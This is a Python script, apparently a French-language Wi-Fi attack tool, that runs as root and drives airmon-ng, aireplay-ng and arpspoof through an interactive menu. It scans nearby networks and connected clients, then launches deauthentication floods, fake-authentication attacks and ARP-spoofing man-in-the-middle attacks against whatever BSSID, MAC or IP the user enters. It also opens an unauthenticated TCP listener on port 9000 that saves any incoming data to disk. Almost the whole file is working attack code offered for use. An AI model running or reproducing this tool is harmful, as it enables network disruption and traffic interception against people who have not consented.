#!/usr/bin/env python3
import os
import sys
import subprocess
import threading
import socket
import signal
import time
from datetime import datetime
from rich.console import Console
from rich.table import Table
from rich.prompt import Prompt, IntPrompt
from rich.panel import Panel

console = Console()
LOG_FILE = "levi_wifi_tool.log"
stop_attack = False

def log(msg):
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    line = f"[{timestamp}] {msg}"
    console.log(line)
    with open(LOG_FILE, "a") as f:
        f.write(line + "\n")

def signal_handler(sig, frame):
    global stop_attack
    stop_attack = True
    log("[red]Interruption reçue, arrêt en cours...[/red]")
    console.print("[red]Arrêt des processus en cours, patientez...[/red]")

signal.signal(signal.SIGINT, signal_handler)

def run_cmd(cmd, capture_output=True):
    """Exécute une commande shell, renvoie stdout ou None si erreur"""
    try:
        result = subprocess.run(cmd, stdout=subprocess.PIPE if capture_output else None,
                                stderr=subprocess.PIPE if capture_output else None,
                                text=True, check=True)
        return result.stdout if capture_output else None
    except subprocess.CalledProcessError as e:
        log(f"[red]Erreur commande '{' '.join(cmd)}' : {e}[/red]")
        return None

def scan_interfaces():
    output = run_cmd(["iwconfig"])
    ifaces = []
    if output:
        for line in output.splitlines():
            if "IEEE 802.11" in line:
                iface = line.split()[0]
                if iface not in ifaces:
                    ifaces.append(iface)
    return ifaces

def enable_monitor_mode(iface):
    log(f"Activation mode moniteur sur {iface}...")
    run_cmd(["ip", "link", "set", iface, "down"], capture_output=False)
    run_cmd(["airmon-ng", "start", iface], capture_output=False)
    time.sleep(2)
    output = run_cmd(["iwconfig"])
    mon_iface = None
    if output:
        for line in output.splitlines():
            if "mon" in line:
                mon_iface = line.split()[0]
                break
    if mon_iface:
        log(f"Interface en mode moniteur détectée : {mon_iface}")
        return mon_iface
    else:
        log("[yellow]Pas d'interface moniteur détectée, on continue avec l'interface d'origine.[/yellow]")
        return iface

def scan_networks(mon_iface):
    console.print(f"[bold]Scan réseaux sur {mon_iface} (15s)...[/bold]")
    output = run_cmd(["timeout", "15", "iwlist", mon_iface, "scan"])
    networks = []
    if output:
        cells = output.split("Cell ")
        for cell in cells[1:]:
            bssid = None
            ssid = None
            channel = None
            signal = None
            lines = cell.splitlines()
            for line in lines:
                line = line.strip()
                if line.startswith("Address:"):
                    bssid = line.split("Address:")[1].strip()
                elif line.startswith("ESSID:"):
                    ssid = line.split("ESSID:")[1].strip().strip('"')
                elif "Channel:" in line:
                    channel = line.split("Channel:")[1].strip()
                elif "Signal level=" in line:
                    signal = line.split("Signal level=")[1].split()[0]
            if bssid:
                networks.append({"BSSID": bssid, "SSID": ssid or "<caché>", "Channel": channel or "N/A", "Signal": signal or "N/A"})
    else:
        console.print("[red]Erreur ou timeout lors du scan réseaux.[/red]")
    return networks

def print_networks(networks):
    table = Table(title="Réseaux WiFi détectés")
    table.add_column("Index", justify="right")
    table.add_column("SSID", style="cyan")
    table.add_column("BSSID", style="magenta")
    table.add_column("Canal", justify="center")
    table.add_column("Signal (dBm)", justify="right")
    for i, net in enumerate(networks):
        table.add_row(str(i), net["SSID"], net["BSSID"], net["Channel"], net["Signal"])
    console.print(table)

def scan_clients(mon_iface):
    console.print(f"[bold]Scan clients connectés sur {mon_iface} (arp-scan)...[/bold]")
    output = run_cmd(["sudo", "arp-scan", "-I", mon_iface, "--localnet"])
    clients = []
    if output:
        lines = output.splitlines()
        for line in lines:
            if line.strip() and not any(line.startswith(prefix) for prefix in ["Interface", "Starting", "Ending", "Packets", "Received", "Host"]):
                parts = line.split()
                if len(parts) >= 2:
                    ip = parts[0]
                    mac = parts[1]
                    clients.append({"IP": ip, "MAC": mac})
    else:
        console.print("[yellow]arp-scan n'a rien retourné ou n'est pas installé.[/yellow]")
    return clients

def print_clients(clients):
    table = Table(title="Clients connectés détectés")
    table.add_column("IP", style="green")
    table.add_column("MAC", style="yellow")
    for c in clients:
        table.add_row(c["IP"], c["MAC"])
    console.print(table)

def attack_deauth(mon_iface, bssid, client_mac, count):
    cmd = ["sudo", "aireplay-ng", "--deauth", str(count), "-a", bssid, "-i", mon_iface]
    if client_mac:
        cmd += ["-c", client_mac]
    run_attack_cmd(cmd, "Deauth")

def attack_fakeauth(mon_iface, bssid, fake_mac, count):
    cmd = ["sudo", "aireplay-ng", "--fakeauth", str(count), "-a", bssid, "-h", fake_mac, "-i", mon_iface]
    run_attack_cmd(cmd, "Fake Auth")

def attack_arpspoof(iface, target_ip, gateway_ip, duration_sec):
    cmd = ["sudo", "arpspoof", "-i", iface, "-t", target_ip, gateway_ip]
    log(f"ARP spoof lancé (Ctrl+C pour arrêter ou {duration_sec}s)...")
    try:
        proc = subprocess.Popen(cmd)
        start_time = time.time()
        while True:
            if stop_attack:
                proc.terminate()
                break
            if duration_sec and (time.time() - start_time) > duration_sec:
                proc.terminate()
                break
            time.sleep(0.3)
    except Exception as e:
        log(f"[red]Erreur ARP spoof : {e}[/red]")

def run_attack_cmd(cmd, name):
    log(f"Lancement attaque {name} : {' '.join(cmd)}")
    console.print(f"[bold yellow]Lancement attaque {name}. Ctrl+C pour arrêter.[/bold yellow]")
    try:
        proc = subprocess.Popen(cmd)
        while True:
            if stop_attack:
                proc.terminate()
                break
            if proc.poll() is not None:
                break
            time.sleep(0.3)
    except Exception as e:
        log(f"[red]Erreur attaque {name} : {e}[/red]")

def send_file(client_ip, filepath):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(20)
        sock.connect((client_ip, 9000))
        with open(filepath, "rb") as f:
            while True:
                data = f.read(4096)
                if not data:
                    break
                sock.sendall(data)
        sock.close()
        log(f"Fichier envoyé avec succès à {client_ip}")
    except Exception as e:
        log(f"[red]Erreur envoi fichier : {e}[/red]")

def file_server():
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.bind(("0.0.0.0", 9000))
    sock.listen(1)
    log("Serveur réception fichier démarré sur port 9000")
    while True:
        conn, addr = sock.accept()
        log(f"Connexion reçue de {addr}")
        with open(f"received_{int(time.time())}.bin", "wb") as f:
            while True:
                data = conn.recv(4096)
                if not data:
                    break
                f.write(data)
        conn.close()
        log("Fichier reçu et sauvegardé.")

def main_menu():
    global stop_attack
    console.clear()

    # Titre en grand ascii art avec couleurs vertes + ton nom en jaune stylé
    title_text = """
[bold green]
   ███████╗███╗   ██╗ █████╗ ███╗   ██╗ █████╗     ███████╗██╗   ██╗██████╗  ██████╗  ██████╗ ██████╗ 
   ██╔════╝████╗  ██║██╔══██╗████╗  ██║██╔══██╗    ██╔════╝██║   ██║██╔══██╗██╔═══██╗██╔═══██╗██╔══██╗
   █████╗  ██╔██╗ ██║███████║██╔██╗ ██║███████║    █████╗  ██║   ██║██████╔╝██║   ██║██║   ██║██████╔╝
   ██╔══╝  ██║╚██╗██║██╔══██║██║╚██╗██║██╔══██║    ██╔══╝  ██║   ██║██╔══██╗██║   ██║██║   ██║██╔═══╝ 
   ███████╗██║ ╚████║██║  ██║██║ ╚████║██║  ██║    ██║     ╚██████╔╝██║  ██║╚██████╔╝╚██████╔╝██║     
   ╚══════╝╚═╝  ╚═══╝╚═╝  ╚═╝╚═╝  ╚═══╝╚═╝  ╚═╝    ╚═╝      ╚═════╝ ╚═╝  ╚═╝ ╚═════╝  ╚═════╝ ╚═╝     
[/bold green]
[bold yellow]                                   by Enama Eyenoah[/bold yellow]
"""
    footer_text = "[bold green]\nSi vous voulez plus d’outils, cherchez [underline]robert-sarah[/underline] sur GitHub\n[/bold green]"

    console.print(title_text)
    console.print(footer_text)

    stop_attack = False
    threading.Thread(target=file_server, daemon=True).start()

    ifaces = scan_interfaces()
    if not ifaces:
        console.print("[red]Aucune interface WiFi détectée. Vérifiez vos pilotes et permissions.[/red]")
        sys.exit(1)

    mon_iface = None
    networks = []
    clients = []

    while True:
        console.print("\n[bold green]Menu Principal:[/bold green]")
        console.print("1) Scanner interfaces WiFi")
        console.print("2) Passer interface en mode moniteur")
        console.print("3) Scanner réseaux WiFi proches")
        console.print("4) Scanner clients connectés")
        console.print("5) Attaque Deauth")
        console.print("6) Attaque Fake Auth")
        console.print("7) Attaque ARP Spoof")
        console.print("8) Envoyer un fichier")
        console.print("9) Quitter")

        choice = Prompt.ask("[bold green]Choisissez une option[/bold green]", choices=[str(i) for i in range(1,10)])

        if choice == "1":
            ifaces = scan_interfaces()
            if ifaces:
                console.print("[green]Interfaces détectées :[/green]")
                for i, iface in enumerate(ifaces):
                    console.print(f"{i}) {iface}")
            else:
                console.print("[red]Aucune interface détectée.[/red]")

        elif choice == "2":
            console.print("Interfaces disponibles :")
            for i, iface in enumerate(ifaces):
                console.print(f"{i}) {iface}")
            idx = IntPrompt.ask("Choisissez interface à passer en mode moniteur", default=0)
            if 0 <= idx < len(ifaces):
                mon_iface = enable_monitor_mode(ifaces[idx])
                console.print(f"[green]Interface moniteur sélectionnée : {mon_iface}[/green]")
            else:
                console.print("[red]Choix invalide.[/red]")

        elif choice == "3":
            if not mon_iface:
                console.print("[red]Activez d'abord le mode moniteur (option 2).[/red]")
                continue
            networks = scan_networks(mon_iface)
            if networks:
                print_networks(networks)
            else:
                console.print("[yellow]Aucun réseau détecté.[/yellow]")

        elif choice == "4":
            if not mon_iface:
                console.print("[red]Activez d'abord le mode moniteur (option 2).[/red]")
                continue
            clients = scan_clients(mon_iface)
            if clients:
                print_clients(clients)
            else:
                console.print("[yellow]Aucun client détecté.[/yellow]")

        elif choice == "5":
            if not mon_iface:
                console.print("[red]Activez d'abord le mode moniteur (option 2).[/red]")
                continue
            bssid = Prompt.ask("BSSID cible")
            client_mac = Prompt.ask("MAC client (laisser vide pour tous)", default="")
            count = IntPrompt.ask("Nombre de paquets (0=continu)", default=10)
            stop_attack = False
            attack_deauth(mon_iface, bssid, client_mac if client_mac else None, count)

        elif choice == "6":
            if not mon_iface:
                console.print("[red]Activez d'abord le mode moniteur (option 2).[/red]")
                continue
            bssid = Prompt.ask("BSSID cible")
            fake_mac = Prompt.ask("Fake MAC", default="00:11:22:33:44:55")
            count = IntPrompt.ask("Nombre de paquets", default=10)
            stop_attack = False
            attack_fakeauth(mon_iface, bssid, fake_mac, count)

        elif choice == "7":
            iface = Prompt.ask("Interface réseau (ex: wlan0)")
            target_ip = Prompt.ask("IP cible")
            gateway_ip = Prompt.ask("IP passerelle")
            duration = IntPrompt.ask("Durée en secondes (0=infini)", default=0)
            duration = None if duration == 0 else duration
            stop_attack = False
            attack_arpspoof(iface, target_ip, gateway_ip, duration)

        elif choice == "8":
            client_ip = Prompt.ask("IP client destinataire")
            filepath = Prompt.ask("Chemin fichier à envoyer")
            if not os.path.isfile(filepath):
                console.print("[red]Fichier introuvable.[/red]")
                continue
            threading.Thread(target=send_file, args=(client_ip, filepath), daemon=True).start()
            console.print("[green]Envoi fichier lancé en arrière-plan.[/green]")

        elif choice == "9":
            console.print("[bold green]Merci d'avoir utilisé Levi Kali WiFi Tool by Enama Eyenoah ![/bold green]")
            sys.exit(0)

if __name__ == "__main__":
    if os.geteuid() != 0:
        console.print("[red]Ce script doit être lancé en root (sudo).[/red]")
        sys.exit(1)
    main_menu()
